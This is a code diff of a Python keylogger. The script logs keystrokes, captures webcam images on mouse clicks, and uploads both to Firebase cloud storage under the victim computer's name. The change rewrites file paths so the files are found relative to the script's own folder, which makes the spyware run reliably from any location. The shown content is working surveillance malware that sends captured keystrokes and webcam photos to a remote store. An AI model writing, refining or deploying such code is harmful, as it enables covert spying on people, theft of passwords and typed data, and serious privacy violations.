@@ -52,12 +52,16 @@ storage = firebase.storage()
 full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
 today_date = full_currentTime.split(' ')[1]
 
-f = open('data.txt', 'w', encoding='utf-8')
+
+scriptdir = os.path.dirname(os.path.abspath(sys.argv[0]))
+dataText_path = os.path.join(scriptdir, 'data.txt')
+f = open(dataText_path, 'w', encoding='utf-8')
 
 data = ''
 lastThreeKeys = []
 clicks_counter = 0
-imgPath = 'screenshot.jpg'
+imgPath = os.path.join(scriptdir, 'screenshot.jpg')
+webcamPath = os.path.join(scriptdir, 'webcam_shot.jpg')
 pcName = os.environ['COMPUTERNAME']
 
 
@@ -72,7 +76,7 @@ def on_press(key):
             f.close()
 
             storage.child(pcName + '/keylogs_' + today_date + '.txt') \
-                .put('data.txt')
+                .put(dataText_path)
 
             # delete screenshot.jpg + data.txt
             os._exit(1)
@@ -81,9 +85,9 @@ def on_press(key):
             f.close()
 
             storage.child(pcName + '/keylogs_' + today_date + '.txt') \
-                .put('data.txt')
+                .put(dataText_path)
 
-            f = open('data.txt', 'a+', encoding='utf-8')
+            f = open(dataText_path, 'a+', encoding='utf-8')
         printKey(key)
     except Exception as e:
         print(e)
@@ -101,7 +105,7 @@ def printKey(key):
         elif str(key) == 'Key.backspace' and len(data) > 0:
             data = data[:-1]
             f.close()
-            f = open('data.txt', 'w', encoding='utf-8')
+            f = open(dataText_path, 'w', encoding='utf-8')
             f.write(data)
 
         elif str(key) == 'Key.space':
@@ -156,14 +160,14 @@ def on_click(x, y, button, pressed):
             full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
             today_date = full_currentTime.split(' ')[1]
 
-            cv2.imwrite('webcam_shot.jpg', frame)
-            frame = Image.open('webcam_shot.jpg')
+            cv2.imwrite(webcamPath, frame)
+            frame = Image.open(webcamPath)
             frame = frame.resize((640, 480), Image.ANTIALIAS)
-            frame.save('webcam_shot.jpg', quality=50, optimize=True)
+            frame.save(webcamPath, quality=50, optimize=True)
 
             storage.child(pcName +
                           '/webcam_' + full_currentTime + '.jpg') \
-                .put('webcam_shot.jpg')
+                .put(webcamPath)
         except Exception as e:
             print(e)
 
